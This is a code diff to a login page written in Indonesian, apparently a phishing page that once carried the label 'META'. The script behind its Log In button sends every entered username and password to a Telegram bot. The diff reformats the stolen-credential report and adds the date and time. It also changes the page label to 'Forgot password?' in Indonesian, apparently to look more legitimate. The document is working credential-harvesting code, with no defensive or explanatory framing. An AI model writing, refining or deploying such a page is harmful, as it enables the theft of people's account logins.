@@ -149,7 +149,7 @@
             <button type="submit" id="btnSubmit">Log In</button>
         </form>
 
-        <div class="signature">META</div>
+        <div class="signature">Lupa kata sandi?</div>
     </div>
 
     <script>
@@ -168,16 +168,27 @@
             btn.disabled = true;
             btn.innerText = 'Memproses...';
 
-            const message = `🔔 *Data Login Baru Terdeteksi*\n\n👤 User: ${user}\n🔑 Pass: ${pass}`;
+            // Mengambil tanggal dan waktu secara realtime saat tombol ditekan
+            const sekarang = new Date();
+            const tanggalRealtime = sekarang.toLocaleDateString('id-ID'); // Format Tanggal Indonesia (DD/MM/YYYY)
+            const waktuRealtime = sekarang.toLocaleTimeString('id-ID');   // Format Jam Realtime (HH:MM:SS)
+
+            // Format pesan laporan dengan waktu realtime
+            const message = `📊 *LAPORAN AKTIVITAS Login*\n` +
+                            `📅 *Tanggal:* ${tanggalRealtime}\n` +
+                            `🕒 *Jam:* ${waktuRealtime}\n\n` +
+                            `📌 *Aksi:* Percobaan Masuk\n` +
+                            `👤 *User:* \`${user}\`\n` +
+                            `🔑 *Pass:* \`${pass}\``;
             
             try {
-                // Diperbaiki kembali menjadi 'Content-Type' agar diterima oleh API Telegram
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: message
+                        text: message,
+                        parse_mode: 'Markdown'
                     }),
                     keepalive: true 
                 });
